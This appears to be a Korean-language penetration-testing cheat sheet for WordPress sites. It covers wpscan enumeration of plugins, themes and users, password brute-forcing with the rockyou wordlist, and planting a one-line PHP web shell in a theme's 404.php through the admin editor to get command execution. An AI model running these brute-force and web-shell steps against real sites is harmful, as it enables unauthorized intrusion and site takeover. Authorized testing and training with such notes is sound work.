# WordPress 점검

- WordPress — 플러그인·테마·사용자 열거부터 크리덴셜 브루트포스, 알려진 취약점 매칭까지 wpscan으로 한 번에 수행하는 점검 절차.
- CMS 식별 단계(whatweb·응답 헤더)에서 WordPress로 판명됐을 때, wp-content·wp-login이 보일 때. 플러그인 취약점이 foothold의 최단 경로인 경우가 많다.
- wpscan 설치 필요(Kali 기본 포함, `apt install wpscan`). 대상 URL과 필요 시 wpscan API 토큰(wp scan 무료 등록 시 발급, 취약점 데이터베이스 조회용).

## WordPress 판별

```bash
# whatweb으로 CMS 확인
whatweb http://target.com
# HTML에서 확인할 흔적
curl -s http://target.com | grep -i "wp-content\|wp-includes"
```

- `wp-content`, `wp-includes`, `xmlrpc.php` 응답이 보이면 WordPress다.

## wpscan 기본 열거

```bash
# 플러그인·테마·버전 전체 열거
wpscan --url http://target.com --enumerate ap,at,u --api-token <토큰>

# 사용자만
wpscan --url http://target.com --enumerate u

# 알려진 취약점이 있는 플러그인만
wpscan --url http://target.com --enumerate vp --api-token <토큰>
```

- `-e ap` 모든 플러그인, `-e at` 모든 테마, `-e u` 사용자, `-e vp` 취약 플러그인, `-e cb` 백업 DB 덤프 탐지.
- API 토큰은 wpscan.com 무료 등록으로 발급받는다. 토큰이 없으면 열거는 되고 취약점 매칭은 안 된다.

## 브루트포스

```bash
# 열거된 사용자에게 rockyou 대입
wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt

# 사용자 목록 파일 전체
wpscan --url http://target.com -U users.txt -P /usr/share/wordlists/rockyou.txt
```

- xmlrpc.php가 열려 있으면 REST보다 빠른 xmlrpc 방식으로 시도한다. `--password-attack xmlrpc`.
- 성공하면 `[+] Valid Combinations Found: admin:Password123` 형태로 나온다.

## 로그인 후 — 테마 편집으로 셸

관리자 계정을 확보했다면 RCE로 바로 간다.

```text
1. /wp-admin 로그인
2. Appearance -> Theme File Editor
3. 404.php (또는 header.php) 에 PHP 웹셸 삽입
   <?php system($_GET['c']); ?>
4. 테마 업데이트 저장
5. http://target.com/wp-content/themes/<테마>/404.php?c=id
```

- 테마 편집이 잠겨 있으면(disabled) 플러그인 업로드(Archive/Extract 플러그인)나 플러그인 편집기를 시험한다.

## 점검 순서 정리

```text
1. CMS 판별 (whatweb / HTML 흔적)
2. wpscan 열거: 플러그인·테마·버전·사용자
3. 취약점 매칭 (API 토큰) -> Exploit-DB·searchsploit 교차 확인
4. 브루트포스 (소수 사용자 + rockyou)
5. 관리자 권한 확보 -> 테마 편집 RCE
```

## 트러블슈팅

- 플러그인 열거가 비어 있으면 passive 모드만 동작한 것이다. `-e ap`를 명시하고, 강제 브루트포스 방식(`--plugins-detection aggressive`)도 시험한다.
- 사용자 열거가 안 되면 REST API(`/wp-json/wp/v2/users`) 차단일 수 있다. author 파라미터(`/?author=1`) 리다이렉트 방식이 열려 있는지 본다.
- 로그인 시도가 너무 많이 잠기면 레이트리미트다. `--throttle` 옵션으로 간격을 두고, 사용자 수를 줄인다.
- 로그인 성공 후 테마 편집기가 안 보이면 권한이 editor 이하인 것이다. 관리자(administrator) 계정인지 다시 확인한다.
- 실습·심화: recon/web-surface/wpscan.md (옵션 상세)
